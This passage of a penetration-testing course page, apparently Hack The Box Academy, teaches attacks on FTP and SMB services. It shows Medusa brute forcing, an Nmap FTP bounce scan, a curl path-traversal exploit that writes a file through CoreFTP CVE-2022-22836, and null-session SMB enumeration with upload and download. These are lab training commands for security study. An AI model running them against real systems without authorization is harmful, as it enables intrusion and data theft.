<span class="hljs-symbol">Password</span>:
<span class="hljs-number">230</span> <span class="hljs-symbol">Login</span> successful.
<span class="hljs-symbol">Remote</span> system type is <span class="hljs-symbol">UNIX</span>.
<span class="hljs-symbol">Using</span> binary mode to transfer files.
ftp&gt; ls
<span class="hljs-number">200</span> <span class="hljs-symbol">PORT</span> command successful. <span class="hljs-symbol">Consider</span> using <span class="hljs-symbol">PASV</span>.
<span class="hljs-number">150</span> <span class="hljs-symbol">Here</span> comes the directory listing.
-rw-r--r--    <span class="hljs-number">1</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>               <span class="hljs-number">9</span> <span class="hljs-symbol">Aug</span> <span class="hljs-number">12</span> <span class="hljs-number">16</span>:<span class="hljs-number">51</span> test.txt
<span class="hljs-number">226</span> <span class="hljs-symbol">Directory</span> send <span class="hljs-symbol">OK</span>.
</code></pre>
<p>Once we get access to an FTP server with anonymous credentials, we can start searching for interesting information. We can use the commands <code>ls</code> and <code>cd</code> to move around directories like in Linux. To download a single file, we use <code>get</code>, and to download multiple files, we can use <code>mget</code>. For upload operations, we can use <code>put</code> for a simple file or <code>mput</code> for multiple files. We can use <code>help</code> in the FTP client session for more information.</p>
<p>In the <a href="https://academy.hackthebox.com/course/preview/footprinting">Footprinting</a> module, we cover detailed information about possible misconfigurations of such services. For example, many different settings can be applied to an FTP server, and some of them lead to different options that could cause possible attacks against that service. However, this module will focus on specific attacks rather than finding individual misconfigurations.</p>
<hr>
<h3 id="protocol-specifics-attacks">Protocol Specifics Attacks</h3>
<p>Many different attacks and methods are protocol-based. However, it is essential to note that we are not attacking the individual protocols themselves but the services that use them. Since there are dozens of services for a single protocol and they process the corresponding information differently, we will look at some.</p>
<p><strong>Brute Forcing</strong></p>
<p>If there is no anonymous authentication available, we can also brute-force the login for the FTP services using a list of the pre-generated usernames and passwords. There are many different tools to perform a brute-forcing attack. Let us explore one of them, <a href="https://github.com/jmk-foofus/medusa">Medusa</a>. With <code>Medusa</code>, we can use the option <code>-u</code> to specify a single user to target, or you can use the option <code>-U</code> to provide a file with a list of usernames. The option <code>-P</code> is for a file containing a list of passwords. We can use the option <code>-M</code> and the protocol we are targeting (FTP) and the option <code>-h</code> for the target hostname or IP address.</p>
<p>Note: Although we may find services vulnerable to brute force, most applications today prevent these types of attacks. A more effective method is Password Spraying.</p>
<p><strong>Brute Forcing with Medusa</strong></p>
<pre><code class="lang-shell-session">[<span class="hljs-name">!bash!</span>]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h <span class="hljs-number">10.129</span>.203.7 -M ftp 

Medusa v2.2 [<span class="hljs-name">http://www.foofus.net</span>] (<span class="hljs-name">C</span>) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;                                                      
ACCOUNT CHECK: [<span class="hljs-name">ftp</span>] Host: <span class="hljs-number">10.129</span>.203.7 (<span class="hljs-name">1</span> of <span class="hljs-number">1</span>, <span class="hljs-number">0</span> complete) User: fiona (<span class="hljs-name">1</span> of <span class="hljs-number">1</span>, <span class="hljs-number">0</span> complete) Password: <span class="hljs-number">123456</span> (<span class="hljs-name">1</span> of <span class="hljs-number">14344392</span> complete)
ACCOUNT CHECK: [<span class="hljs-name">ftp</span>] Host: <span class="hljs-number">10.129</span>.203.7 (<span class="hljs-name">1</span> of <span class="hljs-number">1</span>, <span class="hljs-number">0</span> complete) User: fiona (<span class="hljs-name">1</span> of <span class="hljs-number">1</span>, <span class="hljs-number">0</span> complete) Password: <span class="hljs-number">12345</span> (<span class="hljs-name">2</span> of <span class="hljs-number">14344392</span> complete)
ACCOUNT CHECK: [<span class="hljs-name">ftp</span>] Host: <span class="hljs-number">10.129</span>.203.7 (<span class="hljs-name">1</span> of <span class="hljs-number">1</span>, <span class="hljs-number">0</span> complete) User: fiona (<span class="hljs-name">1</span> of <span class="hljs-number">1</span>, <span class="hljs-number">0</span> complete) Password: <span class="hljs-number">123456789</span> (<span class="hljs-name">3</span> of <span class="hljs-number">14344392</span> complete)
ACCOUNT FOUND: [<span class="hljs-name">ftp</span>] Host: <span class="hljs-number">10.129</span>.203.7 User: fiona Password: family [<span class="hljs-name">SUCCESS</span>]
</code></pre>
<p><strong>FTP Bounce Attack</strong></p>
<p>An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a <code>PORT</code> command to trick the FTP connection into running commands and getting information from a device other than the intended server.</p>
<p>Consider we are targetting an FTP Server <code>FTP_DMZ</code> exposed to the internet. Another device within the same network, <code>Internal_DMZ</code>, is not exposed to the internet. We can use the connection to the <code>FTP_DMZ</code> server to scan <code>Internal_DMZ</code> using the FTP Bounce attack and obtain information about the server&#39;s open ports. Then, we can use that information as part of our attack against the infrastructure.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/116/ftp\_bounce\_attack.png" alt="text"> Source: <a href="https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/">https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/</a></p>
<p>The <code>Nmap</code> -b flag can be used to perform an FTP bounce attack:</p>
<pre><code class="lang-shell-session">[!bash!]$ nmap -Pn -v -n -p80 -b anonymous:password@<span class="hljs-number">10.10</span><span class="hljs-meta">.110</span><span class="hljs-meta">.213</span> <span class="hljs-number">172.17</span><span class="hljs-meta">.0</span><span class="hljs-meta">.2</span>

Starting Nmap <span class="hljs-number">7.80</span> ( https://nmap.org ) <span class="hljs-meta">at</span> <span class="hljs-number">2020</span>-<span class="hljs-number">10</span>-<span class="hljs-number">27</span> <span class="hljs-number">04</span>:<span class="hljs-number">55</span> EDT
Resolved FTP bounce attack proxy to <span class="hljs-number">10.10</span><span class="hljs-meta">.110</span><span class="hljs-meta">.213</span> (<span class="hljs-number">10.10</span><span class="hljs-meta">.110</span><span class="hljs-meta">.213</span>).
Attempting connection to ftp://anonymous:password@<span class="hljs-number">10.10</span><span class="hljs-meta">.110</span><span class="hljs-meta">.213</span>:<span class="hljs-number">21</span>
<span class="hljs-symbol">Connected:</span><span class="hljs-number">220</span> (vsFTPd <span class="hljs-number">3.0</span><span class="hljs-meta">.3</span>)
Login credentials accepted by FTP server!
Initiating Bounce Scan <span class="hljs-meta">at</span> <span class="hljs-number">04</span>:<span class="hljs-number">55</span>
FTP command misalignment detected ... correcting.
Completed Bounce Scan <span class="hljs-meta">at</span> <span class="hljs-number">04</span>:<span class="hljs-number">55</span>, <span class="hljs-number">0.</span>54s elapsed (<span class="hljs-number">1</span> total ports)
Nmap scan report for <span class="hljs-number">172.17</span><span class="hljs-meta">.0</span><span class="hljs-meta">.2</span>
Host is <span class="hljs-meta">up</span>.

PORT   STATE  SERVICE
<span class="hljs-number">80</span>/tcp open http

&lt;SNIP&gt;
</code></pre>
<p>Modern FTP servers include protections that, by default, prevent this type of attack, but if these features are misconfigured in modern-day FTP servers, the server can become vulnerable to an FTP Bounce attack.</p>
<h2 id="latest-ftp-vulnerabilities">Latest FTP Vulnerabilities</h2>
<hr>
<p>In discussing the latest vulnerabilities, we will focus this section and the following ones on one of the previously shown attacks and present it as simply as possible without going into too much technical detail. This should help us facilitate the concept of the attack through an example related to a specific service to gain a better understanding.</p>
<p>In this case, we will discuss the <code>CoreFTP before build 727</code> vulnerability assigned <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-22836">CVE-2022-22836</a>. This vulnerability is for an FTP service that does not correctly process the <code>HTTP PUT</code> request and leads to an <code>authenticated directory</code>/<code>path traversal,</code> and <code>arbitrary file write</code> vulnerability. This vulnerability allows us to write files outside the directory to which the service has access.</p>
<hr>
<h3 id="the-concept-of-the-attack">The Concept of the Attack</h3>
<p>This FTP service uses an HTTP <code>POST</code> request to upload files. However, the CoreFTP service allows an HTTP <code>PUT</code> request, which we can use to write content to files. Let&#39;s have a look at the attack based on our concept. The <a href="https://www.exploit-db.com/exploits/50652">exploit</a> for this attack is relatively straightforward, based on a single <code>cURL</code> command.</p>
<p><strong>CoreFTP Exploitation</strong></p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -<span class="hljs-keyword">k</span> -<span class="hljs-keyword">X</span> PUT -H <span class="hljs-string">"Host: &lt;IP&gt;"</span> --basic -<span class="hljs-keyword">u</span> <span class="hljs-symbol">&lt;username&gt;</span>:<span class="hljs-symbol">&lt;password&gt;</span> --data-binary <span class="hljs-string">"PoC."</span> --path-<span class="hljs-keyword">as</span>-<span class="hljs-keyword">is</span> http<span class="hljs-variable">s:</span>//<span class="hljs-symbol">&lt;IP&gt;</span>/../../../../../../whoops
</code></pre>
<p>We create a raw HTTP <code>PUT</code> request (<code>-X PUT</code>) with basic auth (<code>--basic -u &lt;username&gt;:&lt;password&gt;</code>), the path for the file (<code>--path-as-is https://&lt;IP&gt;/../../../../../whoops</code>), and its content (<code>--data-binary &quot;PoC.&quot;</code>) with this command. Additionally, we specify the host header (<code>-H &quot;Host: &lt;IP&gt;&quot;</code>) with the IP address of our target system.</p>
<p><strong>The Concept of Attacks</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/116/attack\_concept2.png" alt=""></p>
<p>In short, the actual process misinterprets the user&#39;s input of the path. This leads to access to the restricted folder being bypassed. As a result, the write permissions on the HTTP <code>PUT</code> request are not adequately controlled, which leads to us being able to create the files we want outside of the authorized folders. However, we will skip the explanation of the <code>Basic Auth</code> process and jump directly to the first part of the exploit.</p>
<p><strong>Directory Traversal</strong></p>
<table data-header-hidden><thead><tr><th width="94"></th><th width="339"></th><th></th></tr></thead><tbody><tr><td><strong>Step</strong></td><td><strong>Directory Traversal</strong></td><td><strong>Concept of Attacks - Category</strong></td></tr><tr><td><code>1.</code></td><td>The user specifies the type of HTTP request with the file&#39;s content, including escaping characters to break out of the restricted area.</td><td><code>Source</code></td></tr><tr><td><code>2.</code></td><td>The changed type of HTTP request, file contents, and path entered by the user are taken over and processed by the process.</td><td><code>Process</code></td></tr><tr><td><code>3.</code></td><td>The application checks whether the user is authorized to be in the specified path. Since the restrictions only apply to a specific folder, all permissions granted to it are bypassed as it breaks out of that folder using the directory traversal.</td><td><code>Privileges</code></td></tr><tr><td><code>4.</code></td><td>The destination is another process that has the task of writing the specified contents of the user on the local system.</td><td><code>Destination</code></td></tr></tbody></table>

<p>Up to this point, we have bypassed the constraints imposed by the application using the escape characters (<code>../../../../</code>) and come to the second part, where the process writes the contents we specify to a file of our choice. This is when the cycle starts all over again, but this time to write contents to the target system.</p>
<p><strong>Arbitrary File Write</strong></p>
<table data-header-hidden><thead><tr><th width="116"></th><th width="312"></th><th></th></tr></thead><tbody><tr><td><strong>Step</strong></td><td><strong>Arbitrary File Write</strong></td><td><strong>Concept of Attacks - Category</strong></td></tr><tr><td><code>5.</code></td><td>The same information that the user entered is used as the source. In this case, the filename (<code>whoops</code>) and the contents (<code>--data-binary &quot;PoC.&quot;</code>).</td><td><code>Source</code></td></tr><tr><td><code>6.</code></td><td>The process takes the specified information and proceeds to write the desired content to the specified file.</td><td><code>Process</code></td></tr><tr><td><code>7.</code></td><td>Since all restrictions were bypassed during the directory traversal vulnerability, the service approves writing the contents to the specified file.</td><td><code>Privileges</code></td></tr><tr><td><code>8.</code></td><td>The filename specified by the user (<code>whoops</code>) with the desired content (<code>&quot;PoC.&quot;</code>) now serves as the destination on the local system.</td><td><code>Destination</code></td></tr></tbody></table>

<p>After the task has been completed, we will be able to find this file with the corresponding contents on the target system.</p>
<p><strong>Target System</strong></p>
<pre><code class="lang-cmd-session">C:\&gt; <span class="hljs-keyword">type</span> <span class="hljs-type">C:\whoops

</span>PoC.
</code></pre>
<h2 id="attacking-smb">Attacking SMB</h2>
<hr>
<p>Server Message Block (SMB) is a communication protocol created for providing shared access to files and printers across nodes on a network. Initially, it was designed to run on top of NetBIOS over TCP/IP (NBT) using TCP port <code>139</code> and UDP ports <code>137</code> and <code>138</code>. However, with Windows 2000, Microsoft added the option to run SMB directly over TCP/IP on port <code>445</code> without the extra NetBIOS layer. Nowadays, modern Windows operating systems use SMB over TCP but still support the NetBIOS implementation as a failover.</p>
<p>Samba is a Unix/Linux-based open-source implementation of the SMB protocol. It also allows Linux/Unix servers and Windows clients to use the same SMB services.</p>
<p>For instance, on Windows, SMB can run directly over port 445 TCP/IP without the need for NetBIOS over TCP/IP, but if Windows has NetBIOS enabled, or we are targetting a non-Windows host, we will find SMB running on port 139 TCP/IP. This means that SMB is running with NetBIOS over TCP/IP.</p>
<p>Another protocol that is commonly related to SMB is <a href="https://en.wikipedia.org/wiki/Microsoft\_RPC">MSRPC (Microsoft Remote Procedure Call)</a>. RPC provides an application developer a generic way to execute a procedure (a.k.a. a function) in a local or remote process without having to understand the network protocols used to support the communication, as specified in <a href="https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-rpce/290c38b1-92fe-4229-91e6-4fc376610c15">MS-RPCE</a>, which defines an RPC over SMB Protocol that can use SMB Protocol named pipes as its underlying transport.</p>
<p>To attack an SMB Server, we need to understand its implementation, operating system, and which tools we can use to abuse it. As with other services, we can abuse misconfiguration or excessive privileges, exploit known vulnerabilities or discover new vulnerabilities. Furthermore, after we gain access to the SMB Service, if we interact with a shared folder, we need to be aware of the content in the directory. Finally, if we are targetting NetBIOS or RPC, identify which information we can get or what action we can perform on the target.</p>
<hr>
<h3 id="enumeration">Enumeration</h3>
<p>Depending on the SMB implementation and the operating system, we will get different information using <code>Nmap</code>. Keep in mind that when targetting Windows OS, version information is usually not included as part of the Nmap scan results. Instead, Nmap will try to guess the OS version. However, we will often need other scans to identify if the target is vulnerable to a particular exploit. We will cover searching for known vulnerabilities later in this section. For now, let&#39;s scan ports 139 and 445 TCP.</p>
<p>Attacking SMB</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ sudo nmap <span class="hljs-number">10.129</span><span class="hljs-number">.14</span><span class="hljs-number">.128</span> -sV -sC -p139,<span class="hljs-number">445</span>

Starting Nmap <span class="hljs-number">7.80</span> ( <span class="hljs-string">https:</span><span class="hljs-comment">//nmap.org ) at 2021-09-19 15:15 CEST</span>
Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.14</span><span class="hljs-number">.128</span>
Host is up (<span class="hljs-number">0.00024</span>s latency).

PORT    STATE SERVICE     VERSION
<span class="hljs-number">139</span>/tcp open  netbios-ssn Samba smbd <span class="hljs-number">4.6</span><span class="hljs-number">.2</span>
<span class="hljs-number">445</span>/tcp open  netbios-ssn Samba smbd <span class="hljs-number">4.6</span><span class="hljs-number">.2</span>
MAC <span class="hljs-string">Address:</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> (VMware)

Host script <span class="hljs-string">results:</span>
|<span class="hljs-string">_nbstat:</span> NetBIOS <span class="hljs-string">name:</span> HTB, NetBIOS <span class="hljs-string">user:</span> &lt;unknown&gt;, NetBIOS <span class="hljs-string">MAC:</span> &lt;unknown&gt; (unknown)
| smb2-security-<span class="hljs-string">mode:</span> 
|   <span class="hljs-number">2.02</span>: 
|_    Message signing enabled but not required
| smb2-<span class="hljs-string">time:</span> 
|   <span class="hljs-string">date:</span> <span class="hljs-number">2021</span><span class="hljs-number">-09</span><span class="hljs-number">-19</span><span class="hljs-string">T13:</span><span class="hljs-number">16</span>:<span class="hljs-number">04</span>
|_  <span class="hljs-string">start_date:</span> N/A
</code></pre>
<p>The Nmap scan reveals essential information about the target:</p>
<ul>
<li>SMB version (Samba smbd 4.6.2)</li>
<li>Hostname HTB</li>
<li>Operating System is Linux based on SMB implementation</li>
</ul>
<p>Let&#39;s explore some common misconfigurations and protocols specifics attacks.</p>
<hr>
<h3 id="misconfigurations">Misconfigurations</h3>
<p>SMB can be configured not to require authentication, which is often called a <code>null session</code>. Instead, we can log in to a system with no username or password.</p>
<p><strong>Anonymous Authentication</strong></p>
<p>If we find an SMB server that does not require a username and password or find valid credentials, we can get a list of shares, usernames, groups, permissions, policies, services, etc. Most tools that interact with SMB allow null session connectivity, including <code>smbclient</code>, <code>smbmap</code>, <code>rpcclient</code>, or <code>enum4linux</code>. Let&#39;s explore how we can interact with file shares and RPC using null authentication.</p>
<p><strong>File Share</strong></p>
<p>Using <code>smbclient</code>, we can display a list of the server&#39;s shares with the option <code>-L</code>, and using the option <code>-N</code>, we tell <code>smbclient</code> to use the null session.</p>
<p>Attacking SMB</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ smbclient -N -L //10.129.14.128

        Sharename       Type      <span class="hljs-keyword">Comment</span>
        <span class="hljs-comment">-------      --     -------</span>
        <span class="hljs-keyword">ADMIN</span>$          Disk      Remote <span class="hljs-keyword">Admin</span>
        C$              Disk      <span class="hljs-keyword">Default</span> <span class="hljs-keyword">share</span>
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled <span class="hljs-keyword">no</span> workgroup available
</code></pre>
<p><code>Smbmap</code> is another tool that helps us enumerate network shares and access associated permissions. An advantage of <code>smbmap</code> is that it provides a list of permissions for each shared folder.</p>
<p>Attacking SMB</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ smbmap -H 10.129.14.128

[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
        Disk                                                    Permissions     <span class="hljs-keyword">Comment</span>
        <span class="hljs-comment">--                                                   ---------    -------</span>
        <span class="hljs-keyword">ADMIN</span>$                                                  <span class="hljs-keyword">NO</span> <span class="hljs-keyword">ACCESS</span>       Remote <span class="hljs-keyword">Admin</span>
        C$                                                      <span class="hljs-keyword">NO</span> <span class="hljs-keyword">ACCESS</span>       <span class="hljs-keyword">Default</span> <span class="hljs-keyword">share</span>
        IPC$                                                    <span class="hljs-keyword">READ</span> <span class="hljs-keyword">ONLY</span>       IPC Service (DEVSM)
        notes                                                   <span class="hljs-keyword">READ</span>, WRITE     CheckIT
</code></pre>
<p>Using <code>smbmap</code> with the <code>-r</code> or <code>-R</code> (recursive) option, one can browse the directories:</p>
<p>Attacking SMB</p>
<pre><code class="lang-shell-session"><span class="hljs-comment">root@htb</span><span class="hljs-title">[</span><span class="hljs-comment">/htb</span><span class="hljs-title">]</span><span class="hljs-comment">$</span> <span class="hljs-comment">smbmap</span> <span class="hljs-literal">-</span><span class="hljs-comment">H</span> <span class="hljs-comment">10</span><span class="hljs-string">.</span><span class="hljs-comment">129</span><span class="hljs-string">.</span><span class="hljs-comment">14</span><span class="hljs-string">.</span><span class="hljs-comment">128</span> <span class="hljs-literal">-</span><span class="hljs-comment">r</span> <span class="hljs-comment">notes</span>

<span class="hljs-title">[</span><span class="hljs-literal">+</span><span class="hljs-title">]</span> <span class="hljs-comment">Guest</span> <span class="hljs-comment">session</span>       <span class="hljs-comment">IP:</span> <span class="hljs-comment">10</span><span class="hljs-string">.</span><span class="hljs-comment">129</span><span class="hljs-string">.</span><span class="hljs-comment">14</span><span class="hljs-string">.</span><span class="hljs-comment">128:445</span>    <span class="hljs-comment">Name:</span> <span class="hljs-comment">10</span><span class="hljs-string">.</span><span class="hljs-comment">129</span><span class="hljs-string">.</span><span class="hljs-comment">14</span><span class="hljs-string">.</span><span class="hljs-comment">128</span>                           
        <span class="hljs-comment">Disk</span>                                                    <span class="hljs-comment">Permissions</span>     <span class="hljs-comment">Comment</span>
        <span class="hljs-literal">-</span><span class="hljs-literal">-</span>                                                   <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>    <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>
        <span class="hljs-comment">notes</span>                                                   <span class="hljs-comment">READ</span><span class="hljs-string">,</span> <span class="hljs-comment">WRITE</span>
        <span class="hljs-string">.</span><span class="hljs-comment">\notes\*</span>
        <span class="hljs-comment">dr</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">r</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">r</span>               <span class="hljs-comment">0</span> <span class="hljs-comment">Mon</span> <span class="hljs-comment">Nov</span>  <span class="hljs-comment">2</span> <span class="hljs-comment">00:57:44</span> <span class="hljs-comment">2020</span>    <span class="hljs-string">.</span>
        <span class="hljs-comment">dr</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">r</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">r</span>               <span class="hljs-comment">0</span> <span class="hljs-comment">Mon</span> <span class="hljs-comment">Nov</span>  <span class="hljs-comment">2</span> <span class="hljs-comment">00:57:44</span> <span class="hljs-comment">2020</span>    <span class="hljs-string">.</span><span class="hljs-string">.</span>
        <span class="hljs-comment">dr</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">r</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">r</span>               <span class="hljs-comment">0</span> <span class="hljs-comment">Mon</span> <span class="hljs-comment">Nov</span>  <span class="hljs-comment">2</span> <span class="hljs-comment">00:57:44</span> <span class="hljs-comment">2020</span>    <span class="hljs-comment">LDOUJZWBSG</span>
        <span class="hljs-comment">fw</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">w</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">w</span>             <span class="hljs-comment">116</span> <span class="hljs-comment">Tue</span> <span class="hljs-comment">Apr</span> <span class="hljs-comment">16</span> <span class="hljs-comment">07:43:19</span> <span class="hljs-comment">2019</span>    <span class="hljs-comment">note</span><span class="hljs-string">.</span><span class="hljs-comment">txt</span>
        <span class="hljs-comment">fr</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">r</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">r</span>               <span class="hljs-comment">0</span> <span class="hljs-comment">Fri</span> <span class="hljs-comment">Feb</span> <span class="hljs-comment">22</span> <span class="hljs-comment">07:43:28</span> <span class="hljs-comment">2019</span>    <span class="hljs-comment">SDT65CB</span><span class="hljs-string">.</span><span class="hljs-comment">tmp</span>
        <span class="hljs-comment">dr</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">r</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">r</span>               <span class="hljs-comment">0</span> <span class="hljs-comment">Mon</span> <span class="hljs-comment">Nov</span>  <span class="hljs-comment">2</span> <span class="hljs-comment">00:54:57</span> <span class="hljs-comment">2020</span>    <span class="hljs-comment">TPLRNSMWHQ</span>
        <span class="hljs-comment">dr</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">r</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">r</span>               <span class="hljs-comment">0</span> <span class="hljs-comment">Mon</span> <span class="hljs-comment">Nov</span>  <span class="hljs-comment">2</span> <span class="hljs-comment">00:56:51</span> <span class="hljs-comment">2020</span>    <span class="hljs-comment">WDJEQFZPNO</span>
        <span class="hljs-comment">dr</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">r</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">r</span>               <span class="hljs-comment">0</span> <span class="hljs-comment">Fri</span> <span class="hljs-comment">Feb</span> <span class="hljs-comment">22</span> <span class="hljs-comment">07:44:02</span> <span class="hljs-comment">2019</span>    <span class="hljs-comment">WindowsImageBackup</span>
</code></pre>
<p>From the above example, the permissions are set to <code>READ</code> and <code>WRITE</code>, which one can use to upload and download the files.</p>
<p>Attacking SMB</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ smbmap -H <span class="hljs-number">10.129.14.128</span> --download <span class="hljs-string">"notes\note.txt"</span>

<span class="hljs-string">[+]</span> Starting download: notes\note.txt (<span class="hljs-number">116</span> bytes)
<span class="hljs-string">[+]</span> File output to: /htb/<span class="hljs-number">10.129.14.128</span>-notes_note.txt
</code></pre>
<p>Attacking SMB</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ smbmap -H <span class="hljs-number">10.129.14.128</span> --upload test.txt <span class="hljs-string">"notes\test.txt"</span>

<span class="hljs-string">[+]</span> Starting upload: test.txt (<span class="hljs-number">20</span> bytes)
<span class="hljs-string">[+]</span> Upload complete.
</code></pre>
<p><strong>Remote Procedure Call (RPC)</strong></p>
<p>We can use the <code>rpcclient</code> tool with a null session to enumerate a workstation or Domain Controller.</p>
<p>The <code>rpcclient</code> tool offers us many different commands to execute specific functions on the SMB server to gather information or modify server attributes like a username. We can use this <a href="https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf">cheat sheet from the SANS Institute</a> or review the complete list of all these functions found on the <a href="https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html">man page</a> of the <code>rpcclient</code>.</p>
<p>Attacking SMB</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ rpcclient -U'%' <span class="hljs-number">10.10.110.17</span>

rpcclient $&gt; enumdomusers

user:<span class="hljs-string">[mhope]</span> rid:<span class="hljs-string">[0x641]</span>
user:<span class="hljs-string">[svc-ata]</span> rid:<span class="hljs-string">[0xa2b]</span>
user:<span class="hljs-string">[svc-bexec]</span> rid:<span class="hljs-string">[0xa2c]</span>
user:<span class="hljs-string">[roleary]</span> rid:<span class="hljs-string">[0xa36]</span>
user:<span class="hljs-string">[smorgan]</span> rid:<span class="hljs-string">[0xa37]</span>
</code></pre>
<p><code>Enum4linux</code> is another utility that supports null sessions, and it utilizes <code>nmblookup</code>, <code>net</code>, <code>rpcclient</code>, and <code>smbclient</code> to automate some common enumeration from SMB targets such as:</p>
<ul>
<li>Workgroup/Domain name</li>
<li>Users information</li>
<li>Operating system information</li>
<li>Groups information</li>
<li>Shares Folders</li>
<li>Password policy information</li>
</ul>
<p>The <a href="https://github.com/CiscoCXSecurity/enum4linux">original tool</a> was written in Perl and <a href="https://github.com/cddmp/enum4linux-ng">rewritten by Mark Lowe in Python</a>.</p>
<p>Attacking SMB</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ./enum4linux-ng.<span class="hljs-keyword">py</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.45</span> -A -C

ENUM4LINUX - <span class="hljs-keyword">next</span> generation

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... <span class="hljs-number">10.10</span>.<span class="hljs-number">11.45</span>
[*] Username ......... <span class="hljs-string">''</span>
[*] Random Username .. <span class="hljs-string">'noyyglci'</span>
[*] Password ......... <span class="hljs-string">''</span>

 ====================================
|    Service Scan <span class="hljs-keyword">on</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.45</span>     |
 ====================================
[*] Checking LDAP (timeou<span class="hljs-variable">t:</span> <span class="hljs-number">5</span>s)
[-] Could not connect <span class="hljs-keyword">to</span> LDAP <span class="hljs-keyword">on</span> <span class="hljs-number">389</span>/tcp: connection refused
[*] Checking LDAPS (timeou<span class="hljs-variable">t:</span> <span class="hljs-number">5</span>s)
[-] Could not connect <span class="hljs-keyword">to</span> LDAPS <span class="hljs-keyword">on</span> <span class="hljs-number">636</span>/tcp: connection refused
[*] Checking SMB (timeou<span class="hljs-variable">t:</span> <span class="hljs-number">5</span>s)
[*] SMB <span class="hljs-keyword">is</span> accessible <span class="hljs-keyword">on</span> <span class="hljs-number">445</span>/tcp
[*] Checking SMB over NetBIOS (timeou<span class="hljs-variable">t:</span> <span class="hljs-number">5</span>s)
[*] SMB over NetBIOS <span class="hljs-keyword">is</span> accessible <span class="hljs-keyword">on</span> <span class="hljs-number">139</span>/tcp

 ===================================================                            
|    NetBIOS Names <span class="hljs-built_in">and</span> Workgroup <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.45</span>    |
 ===================================================                                                                                         
[*] Got domain/workgroup name: WORKGROUP
[*] Full NetBIOS names information:
- WIN-<span class="hljs-number">752039204</span> <span class="hljs-symbol">&lt;00&gt;</span> -          B <span class="hljs-symbol">&lt;ACTIVE&gt;</span>  Workstation Service
- WORKGROUP     <span class="hljs-symbol">&lt;00&gt;</span> -          B <span class="hljs-symbol">&lt;ACTIVE&gt;</span>  Workstation Service
- WIN-<span class="hljs-number">752039204</span> <span class="hljs-symbol">&lt;20&gt;</span> -          B <span class="hljs-symbol">&lt;ACTIVE&gt;</span>  Workstation Service
- MAC Address = <span class="hljs-number">00</span>-<span class="hljs-number">0</span>C-<span class="hljs-number">29</span>-D7-<span class="hljs-number">17</span>-DB
...
 ========================================
|    SMB Dialect Check <span class="hljs-keyword">on</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.45</span>    |
 ========================================

<span class="hljs-symbol">&lt;SNIP&gt;</span>
</code></pre>
<hr>
<h3 id="protocol-specifics-attacks">Protocol Specifics Attacks</h3>
<p>If a null session is not enabled, we will need credentials to interact with the SMB protocol. Two common ways to obtain credentials are <a href="https://en.wikipedia.org/wiki/Brute-force\_attack">brute forcing</a> and <a href="https://owasp.org/www-community/attacks/Password\_Spraying\_Attack">password spraying</a>.</p>
<p><strong>Brute Forcing and Password Spray</strong></p>
<p>When brute-forcing, we try as many passwords as possible against an account, but it can lock out an account if we hit the threshold. We can use brute-forcing and stop before reaching the threshold if we know it. Otherwise, we do not recommend using brute force.</p>
